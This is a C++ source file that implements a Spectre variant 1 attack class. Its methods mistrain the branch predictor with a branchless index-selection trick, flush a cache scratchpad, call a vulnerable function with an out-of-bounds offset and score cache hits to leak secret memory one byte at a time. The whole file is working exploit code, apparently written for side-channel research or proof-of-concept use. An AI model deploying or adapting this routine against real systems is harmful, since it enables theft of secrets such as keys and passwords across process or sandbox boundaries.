//
// Created by sage on 1/13/21.
//

#include <stdafx.h>
#include <Spectrev1.h>
#include <cacheutils.h>

void Spectrev1::read(void *p_secret, size_t n_bytes, uint8_t *p_buf)
{
    for(auto i = 0; i < n_bytes; ++i)
    {
        read_byte(MEM_ADD(p_secret,i), &p_buf[i]);
    }
}


void Spectrev1::read_byte(void *p_secret, uint8_t *p_val)
{
    // TODO: need to make sure sratchpad is backed
    memset(results, 0 , sizeof(results));
    size_t mal_x = (reinterpret_cast<uint8_t*>(p_secret) - p_base);

    for (auto tries = n_max_tries; tries > 0; --tries)
    {
        do_attack(fn_make_legal(tries), mal_x);

        if (results[high] >= (2*results[high2] + n_trainings) ||
            (results[high] == 2 && results[high2] == 0))
        {
            break;
        }
    }

    *p_val = (uint8_t)high;
}

inline void Spectrev1::do_attack(size_t train_x, size_t mal_x)
{
    // Flush scratchpad
    for (auto i = 0; i < MAX_BYTE; ++i)
        flush(MEM_ADD(p_scratchpad, i*block_len));

    mistrain(train_x, mal_x);

    find_hits(train_x);
}

inline void Spectrev1::mistrain(size_t train_x, size_t mal_x)
{
    uint64_t x;
    for (int i = 3*n_trainings-1; i >= 0; --i)
    {
        fn_setup();

        // Set x to mal_x when i % (n_trainings+1) == 0
        x = (i % (n_trainings+1));
        x = (x-1)/(x+1);
        x = train_x ^ (x & (mal_x ^ train_x));

        fn_vuln(x);
    }
}

inline void Spectrev1::find_hits(size_t train_x)
{
    high = high2 = -1;
    for (auto i = 0; i < MAX_BYTE; ++i)
    {
        int mix_i = MIX(i);
        if ( is_hit(load(MEM_ADD(p_scratchpad, mix_i*block_len))) && mix_i != p_base[train_x] )
        {
            ++results[mix_i];
        }
    }

    // Find the two highest scores
    for (auto i = 0; i < MAX_BYTE; ++i)
    {
        if (high < 0 || results[i] >= results[high])
        {
            high2 = high;
            high = i;
        }
        else if (high2 < 0 || results[i] >= results[high2])
        {
            high2 = i;
        }
    }
}
